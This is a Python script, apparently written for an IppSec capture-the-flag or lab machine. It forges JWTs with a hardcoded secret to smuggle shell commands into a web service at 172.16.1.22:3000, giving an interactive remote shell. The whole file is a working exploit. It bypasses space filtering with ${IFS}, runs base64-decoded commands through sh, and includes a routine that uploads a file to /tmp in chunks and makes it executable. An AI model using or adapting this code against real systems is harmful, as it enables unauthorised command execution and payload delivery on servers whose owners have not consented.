import requests
import jwt
import base64
import os

crutch = False

def create_base64(cmd):
	cmd_bytes = cmd.encode('ascii')
	b64bytes = base64.b64encode(cmd_bytes)
	b64msg = b64bytes.decode('ascii')

	return b64msg

def fire_request(cmd):
	encjwt = jwt.encode({"cmd": cmd}, \
			"hope you enjoy this challenge -ippsec", \
			algorithm="HS256")

	payload = "Bearer " + encjwt.decode("utf-8")

	r = requests.get(url="http://172.16.1.22:3000" \
					 ,headers={"Authorization":payload})

	if crutch == True:
		print(r.text)

def upload_File():
	to_upload = input("Path to File: ")
	dest_filename = to_upload.split("/")[-1]

	print("Deleting previous entries to avoid errors...")
	cmd = 'rm${IFS}/tmp/uploadb64'
	fire_request(cmd)
	cmd = 'rm${IFS}/tmp/' + dest_filename
	print("Deleted!")

	print("Converting local File...")
	os.system("cat {} | base64 > uploadb64".format(to_upload))

	print("Done! Beginning Upload...")

	with open("uploadb64","r") as file:
		def read1k():
			return file.read(1024*30)

		print("Uploading. This will take a while!!")

		for chunk in iter(read1k, ''):
			cmd = 'echo${IFS}-n${IFS}"' + chunk + '">>/tmp/uploadb64'
			print(cmd)
			fire_request(cmd)

		print("UPLOADED!")

		print("Converting back to original...)")
		cmd = 'cat${IFS}/tmp/uploadb64|base64${IFS}-d>/tmp/' + dest_filename
		fire_request(cmd)

		print("Making the File Executable...")
		cmd = 'chmod${IFS}+x${IFS}/tmp/' + dest_filename
		fire_request(cmd)

		print("Done!")
		
while True:
	crutch = False

	cmd = input("ipp-sucks~#: ")
	
	if cmd == "upload":
		upload_File()

	#First Command
	#read input encoded into file
	cmd = 'echo${IFS}"' + create_base64(cmd) + '">/tmp/x'
	fire_request(cmd)

	#second command
	#cat, decode into sh and > to other file
	cmd = 'cat${IFS}/tmp/x|base64${IFS}-d|sh>/tmp/y'
	fire_request(cmd)

	#third command
	#read other file
	crutch = True
	cmd = 'cat${IFS}/tmp/y'
	fire_request(cmd)